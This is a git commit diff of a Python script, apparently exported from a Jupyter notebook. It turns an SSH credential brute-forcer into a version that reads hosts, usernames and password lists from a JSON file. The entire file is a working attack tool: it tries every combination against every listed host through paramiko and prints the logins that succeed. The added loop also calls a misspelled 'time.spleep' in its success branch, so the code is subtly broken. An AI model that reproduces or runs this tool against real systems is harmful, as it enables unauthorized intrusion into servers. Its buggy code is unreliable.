71cabc380551e834e95d9b2313783e99889fe421
Alessandro De Iturbe <aledei2250@gmail.com>
2021-12-15 19:56:07 +0100

    Update: 1. Use one JSON file instaed of three txt files 2. Auto Generate JSON file in case of missing file, with defaults camps

--- main.py
+++ main.py
@@ -1,54 +1,127 @@
-import paramiko
+#!/usr/bin/env python
+# coding: utf-8
+
+# In[21]:
+
+
+import os
 import time
 from colorama import init, Fore
+import paramiko
+import json
+import time
 
-init()
+
+# In[22]:
+
 
 green = Fore.GREEN
 red = Fore.RED
+yellow = Fore.YELLOW
 blue = Fore.BLUE
-reset = Fore.YELLOW
+purple = Fore.MAGENTA
+reset = Fore.RESET
 
-try:
-    with open("names.txt", "r") as f:
-        names = f.read().split('\n')
-except FileNotFoundError:
-    print("names.txt not found. Please create it and add your usernames.")
-    exit()
-try:
-    with open("credentials.txt", "r") as f:
-        passwds = f.read().split('\n')
-except FileNotFoundError:
-    print("credentials.txt not found. Please create it and add your passwords.")
-    exit()
 
-if len(names) == 1 and names[0] == '':
-    print("names.txt is empty. Please add your usernames.")
-    exit()
-if len(passwds) == 1 and passwds[0] == '':
-    print("credentials.txt is empty. Please add your passwords.")
-    exit()
+# In[23]:
 
-def is_ssh_open(hostname, username, passwd):
+
+def error(mode, string):
+    if mode == 'p':
+        string = red + string + reset
+        print(string)
+        return string
+    if mode == 'i':
+        string = red + string + reset
+        opt = input(string)
+        return opt
+    
+def success(mode, string):
+    if mode == 'p':
+        string = green + string + reset
+        print(string)
+        return string
+    if mode == 'i':
+        string = green + string + reset
+        opt = input(string)
+        return opt
+
+def message(mode, string):
+    if mode == 'p':
+        string = blue + string + reset
+        print(string)
+        return string
+    if mode == 'i':
+        string = blue + string + reset
+        opt = input(string)
+        return opt
+
+
+# In[24]:
+
+
+def is_open(host, usr, passwd):
     client = paramiko.SSHClient()
-
+    
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     try:
-        client.connect(hostname, username=username, password=passwd, timeout=5)
-        print(green + "Success: " + hostname + " " + username + " " + passwd + reset)
+        client.connect(host, username=usr, password=passwd, timeout = 5)
+        success('p', 'Success: \nusername = {} \npassword = {}'.format(usr, passwd))
         client.close()
         return True
     except paramiko.AuthenticationException:
-        print(red + "Invalid credentials for " + username + ":" + passwd + reset)
+        error('p', 'Connection refused\nusername = {}\npasswords = {}'.format(usr, passwd))
         return False
 
-host = input("Host IP: ")
 
-for name in names:
-    for passwd in passwds:
-        if is_ssh_open(host, name, passwd):
-            pass
+# In[25]:
+
+
+connections = {}
+default_file = {'hosts': [], 'usrs': [], 'passwds': []}
+
+
+# In[26]:
+
+
+if not os.path.exists('hosts.json'):
+    with open('hosts.json', 'w') as f:
+        json.dump(default_file, f)
+        error('p', 'hosts.json not exists. Creating one...')
+        message('p', 'Insert values in hosts.json and restart.')
+        exit()
+else:
+    with open('hosts.json', 'r') as f:
+        connections = json.load(f)
+        if connections == default_file:
+            error('p', 'Insert data in hosts.json')
+            exit()
         else:
-            print(red + "Failed: " + name + " " + passwd + reset)
-            time.sleep(1)
+            for i in connections:
+                if len(connections[i]) == 0:
+                    error('p', 'Insert {}'.format(i))
+                    exit()
+                else:
+                    message('p', 'Found {} {}'.format(len(connections[i]), i))
+            hosts = connections['hosts']
+            usrs = connections['usrs']
+            passwds = connections['passwds']
+
+
+# In[27]:
+
+
+for host in hosts:
+    for usr in usrs:
+        for passwd in passwds:
+            if is_open(host, usr, passwd):
+                pass
+                time.spleep(1)
+
+
+# In[ ]:
+
+
+
+
